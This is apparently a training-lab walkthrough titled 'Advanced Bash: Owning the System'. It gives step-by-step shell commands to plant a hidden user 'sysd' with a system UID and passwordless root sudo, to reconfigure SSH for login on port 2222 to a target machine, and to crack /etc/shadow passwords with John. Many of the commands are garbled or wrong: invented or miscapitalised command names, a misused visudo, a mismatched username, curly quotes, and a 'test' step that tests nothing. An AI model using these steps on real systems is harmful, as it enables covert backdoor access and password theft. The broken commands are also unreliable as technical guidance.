
# **Advanced Bash: Owning the System**

_____


## Step 1: Shadow People

### 1.**Create a secret user named sysd. Make sure this user doesn't have a home folder created**.

    user -rMo -u 600 sysd


### 2.**Give your secret user a password**. 

    Passwd sysd


### 3.**Give your secret user a system UID < 1000**.

    Usermod -u 600 sysd


### 4.**Give your secret user the same GID**.

    Groupmod -g 600 sysd


### 5.**Give your secret user full sudo access without the need for a password**.

    Visudo sys ALL=(ALL:ALL) NOPASSWD:ALL


### 6.**Test that sudo access works without your password**.

    Cat /etc/sudoers | grep -i sysd | awk ‘{ print $3 }’



## *Step 2: Smooth Sailing*

### 1.**Edit the sshd_config file**.

    Sudo nano /etc/ssh/sshd_config



## *Step 3: Testing Your Configuration Update* 

### 1.**Restart the SSH service**.

    Systemctl restart ssh.service 


### 2.**Exit the root account**.

    exit


### 3.**SSH to the target machine using your sysd account and port 2222**.

    Ssh sysd@192.168.6.105 -p 2222


### 4.**Use sudo to switch to the root user**.

    Sudo -s



## *Step 4: Crack All the Passwords*

### 1.**SSH back to the system using your sysd account and port 2222**.

    Ssh sysd@192.168.6.105 -p 2222


### 2.**Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file**.

    John password.txt